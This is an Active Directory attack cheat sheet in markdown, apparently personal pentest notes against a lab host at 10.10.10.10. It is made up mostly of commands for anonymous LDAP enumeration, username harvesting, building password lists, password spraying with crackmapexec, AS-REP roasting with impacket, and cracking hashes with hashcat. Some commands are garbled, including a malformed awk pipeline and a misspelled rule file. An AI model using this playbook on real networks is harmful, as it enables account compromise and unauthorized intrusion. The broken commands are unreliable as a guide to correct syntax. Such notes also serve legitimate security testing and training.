# LDAP

Port: 389
IP: 10.10.10.10

Ldap has decent attack surface.

## Usages

`ldapsearch -h 10.10.10.10 -x  -s base namingcontext`
-x: basic authentication
-s: scope
base: `namingcontext`

```Output
dn:
namingcontext: DC=nullbrain,DC=local
namingcontext: CN=configuration,DC=nullbrain,DC=local
```


`ldapsearch -h 10.10.10.10 -x -b "DC=nullbrain,DC=local" > ldap-anonymous.out`
or,
`ldapsearch -h 10.10.10.10 -x -b "DC=nullbrain,DC=local" '(objectClass=person)'`

```Output
Important informations like
	Creationdate: when created
	Email: email
	Login success: count
```


Windows usage AD timestamp could be converted to human readable at https://www.epochconverter.com/

### passwordspray

1. `STOP`  & `check` if `passwordspray` is going to lock accounts.
	- `crackmapexec smb 10.10.10.10 --pass-pol`
	Or,
	- with password policy in order to do null authentication attempt
		- NOTE: This doesnot work with vanila 2016+
		`crackmapexec smb 10.10.10.10 --pass-pol -u'' -p''`
		Check for account lockout threshold.
	Or,
	- `enum4linux 10.10.10.10`
1. Generate list of username
	`ldapsearch -h 10.10.10.10 -x -b "DC=nullbrain,DC=local" '(objectClass=person) SAMAccountName | grep sAMAccountName awk {}'print $2'}`
	- include: user account (none computer/exchange)
	Or,
	- `rpcclient -U '' 10.10.10.10`
		- `enumdomusers`
			- `queryuser ridxxx`
	- store all at `userlist.out`
1. Create password list. (`pwlist.txt`)
	- Include:
		- months are nice thing to brute-force (`January`...`December`)
		- `password`, `p@ssw0rd`, secret, season (autumn, winter, summer)
		- servername, vendor name etc.
		- `years`, `!`: `for i in $(cat pwlist.txt); do echo $i; echo ${i}2019; echo ${i}2020; echo ${i}\!; done`
		- mutate passwords: `hashcat --force --stdout pwlist.txt -r /usr/share/hashcat/rules/best64.rule`
		- Toggle various upper cases: `-r /usr/share/hashcat/rules/toggels1.txt
		- Truncate duplicates & greater than 7: `| sort -u | awk 'length($0)' > 7`
1. Fire
	- Run in TMUX or some session as it is going to take some time.
	- `crackmapexec smb 10.10.10.10 -u userlist.out -p pwlist.txt`
1. ASREPRoast with [impacket](https://github.com/SecureAuthCorp/impacket) 
	- `GetNPUsers.py`
		- For users that do not require kerberos preauthentication.
			- Below command would give hash upon success using that we can crack the hash using correct id.
			- `./GetNPUsers.py dc-ip 10.10.10.10 -request 'nullbrain.local/' -format hashcat`
	- Check hash type
		- `./hashcat --example-hashes | grep -i <hash_string>`
		- ensure and get id <18200>
	- crack the hash
		- `./hashcat -m <18200> hashes/my-stored-hash /opt/wordlist/rockyou.txt -r rules/InsidePro-PasswordsPro.rule`
			- rules for cracking, good to start with `InsidePro-PasswordsPro.rule`
3. Check if compromised user from above has access.
	- `crackmapexec smb 10.10.10.10 -u <username> -p <password>` , Or,
	- `crackmapexec smb 10.10.10.10 -u <username> -p <password> --shares 
	- Pawned?
		- if Not
			- Finding Passwords in SYSVOL & Exploiting Group Policy Preferences [winPEAS checks group policy] (https://github.com/nullbr41n/nullbrain/tree/main/active-directory/winrm.md)